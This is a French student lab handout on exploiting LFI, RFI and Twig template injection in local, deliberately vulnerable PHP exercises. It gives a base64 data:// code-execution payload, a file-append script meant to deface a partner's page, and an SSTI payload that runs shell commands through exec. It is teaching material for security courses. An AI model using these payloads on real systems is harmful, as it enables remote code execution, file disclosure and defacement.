# TP - Sécurité LFI, RFI et Template Injection
- **Auteur :** DESBOUYS Maxence, MAGALHAES Thomas, THEUWS Gabriel et VALENTIN Guillaume
- **Année :** 2021 -2022
- **Date de rendu :** 2 février 2022 (1 semaine pour le faire)
- **Adresse mail du compte rendu :** thomas.magalhaes@etu.uca.fr
- **Le rendu :** un document .txt ou .pdf répondant aux questions

# Disclaimer
Tous les éléments que vous verrez dans ce TP ont été "patchés" dans les versions les plus récentes. De plus, vous êtes seul responsable de l’usage que vous pourriez faire de ces techniques sur des sites tiers, elles vous sont présentées ici à des fins éducatives.

# Le tp
### Mise en place :

 - Récupérer le dépôt
 - Vérifiez que vous avez php sur votre machine *(php est déjà présent à l'iut)*
 - Lancer la commande qui suit à la racine de ce projet afin de démarrer un serveur php
   ``` php --php-ini php.ini -S localhost:3054 ```
  - Utilisez votre navigateur préféré et allez sur l’url.
  [http://localhost:3054/](http://localhost:3054/)

### Les astuces
Astuce regarder : Null Byte Injection
   
## LFI
   
### Exercice n°1.1 LFI
Cliquez sur "Exo 1 LFI"

**Votre mission : ~~(si vous l'acceptez)~~**

Trouvez le moyen d'afficher dans la page le contenu du fichier "cible.txt" .
Ce dernier est situé au même niveau dans l'arborescence que la page.
Notez l'url saisie dans votre compte rendu.

---

### Exercice n°1.2 LFI
Cliquez sur "Exo 2 LFI"

**Votre mission :**

Trouvez le moyen d'afficher dans la page le contenu du fichier "cible.txt" .
Ce dernier est situé au même niveau dans l'arborescence que la page. 
Notez l'url saisie dans votre compte rendu.

---

### Exercice n°1.3 LFI
Cliquez sur "Exo 2 LFI"

**Votre mission :**

Trouvez le moyen d'afficher dans la page le contenu du fichier "cibleHaute.secu" .
Ce dernier est situé à un niveau plus haut dans l'arborescence. 
Notez l'url saisie dans votre compte rendu.
Dans le même temps,  trouver un moyen de récupérer tous les utilisateurs de la machine.
Notez l'url saisie dans votre compte rendu ainsi que le résultat.

---

## RFI

### Exercice n°2.1 RFI
Cliquez sur "Exo 1 RFI"

**Votre mission :**

Trouvez le moyen d'afficher le contenu d'un autre site dans votre page.
Notez l'url saisie dans votre compte rendu.

---

### Exercice n°2.2 RFI
Cliquez sur "Exo 2 RFI"

**Votre mission :**

Trouvez le moyen d'afficher le contenu d'un autre site dans votre page.
Notez l'url saisie dans votre compte rendu.

---

### Exercice n°2.3 RFI
Cet exercice ce fait avec un autre binôme/collègue. Si vous n'en n'avez pas ou qu'il n'est pas à cet exercice, nous mettrons en place un serveur accessible par l'intranet. \[EDIT\] vous pouvez aussi vous attaquer vous même, dans ce cas votre serveur est toujours localhost.

#### Mise en place pour le serveur :
2. Créer un fichier index.php qui possède un titre h1 et une inclusion de fichier sans vérification de l’entrée. Vous pouvez faire comme [l'index.php de l'exercice 1](/exo_rfi/index.php).
3. Lancer votre serveur PHP en précisant l'IPv4 ou localhost au choix.

#### Protocole à suivre pour le client :
1. Avec votre navigateur préféré, obtenir la page d'accueil.
2. Puisque vous connaissez la faille, en injectant de l'HTML ou du PHP de votre choix. Si vous n'avez vraiment pas d'idée, prenez ce [index.html](https://github.com/LINCnil/Guide-RGPD-du-developpeur/blob/main/index.html).
```pour obtenir le lien brut, cliquez sur le bouton 'raw'```

---

### Exercice n°2.3 RFI suite
```diff
-Il est maitenant temps de jouer !!!
```

Mais avant des explications qui vous seront utiles dans votre périple.

L'url suivant permet d'afficher le phpinfo() sur serveur ciblé.
```
http://localhost:3054/exo_rfi/?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
```
La première partie (```http://localhost:3054/exo_rfi/?file=```) correspond à la partie dite "normale".

La seconde partie (```data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B```) correspond à la partie saisie par l'utilisateur.

>data://text/plain;base64,

Permet d'envoyer au serveur du text en base 64 (utile pour l'attaque)

>PD9waHAgcGhwaW5mbygpOz8

Correspond ici a ```<?php phpinfo();?>```  en base 64

>%2B

Termine l'url

---

Pour trouver la correspondance en base 64 de votre code php voir le lien ci-dessous

EDIT 1 (Il faut retirer les caractères "+","-" et "=" si il y en a à la fin) les underscore aussi, rajoutez des commentaires pour ne plus en avoir dans le base64

EDIT 2 Prenez la base64 url encoding

[https://www.base64url.com/](https://www.base64url.com/)


```
input: <?php echo "bonjour"; ?>
result: PD9waHAgZWNobyAiYm9uam91ciI7ID8+
result clean: PD9waHAgZWNobyAiYm9uam91ciI7ID8
url final : http://localhost:3054/exo_rfi/?file=data://text/plain;base64,PD9waHAgZWNobyAiYm9uam91ciI7ID8%2B
```

**Votre mission :**

Vous allez devoir rajouter à l'index du serveur d'autre personne vos noms.

Le script php qui suit vous permet d'ajouter en fin de fichier du texte.
Utilisez le pour ajouter vos prénoms dans l'index du serveur ciblé. 
```php
<?php
$file = ''; // <--- le fichier ou sera ajoute le code
$text = ""; // <--- le texte a ajouter
file_put_contents($file, $text, FILE_APPEND | LOCK_EX);
?>
```
Notez l'url saisie dans votre compte rendu ainsi que les étapes pour l'obtenir.

---

### Exercice n°3.1 SSTI

Pour commencer vous devez lancer votre machine VDN nommé docker-tmp, puis dans celle-ci cloner le repository git : https://github.com/GoSecure/template-injection-workshop. 
Ensuite vous lancerez un docker dans le fichier `template-injection-workshop/12_template_twig_php/` et vous vous y connecterez via le port `8012` de local host (127.0.0.1):
```bash
$ vdn docker-tmp
vdn:...$ git clone https://github.com/GoSecure/template-injection-workshop
vdn:...$ cd template-injection-workshop/12_template_twig_php/
vdn:.../12_template_twig_php$ docker-compose up

vdn:...$ links http://localhost:8012/
 ### ou ###
vdn:...$ links 127.0.0.1:8012/
```

**Votre mission :**

Une fois cela fait votre mission consite à récupérer le flag en utilisant une template injection.

---

### Aide
La commande suivante vous sera utile dans votre recherche du flag: ``{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("echo -E `ls /`")}}``

Regarder son résultat et sa structure pour en déduire les informations utiles.
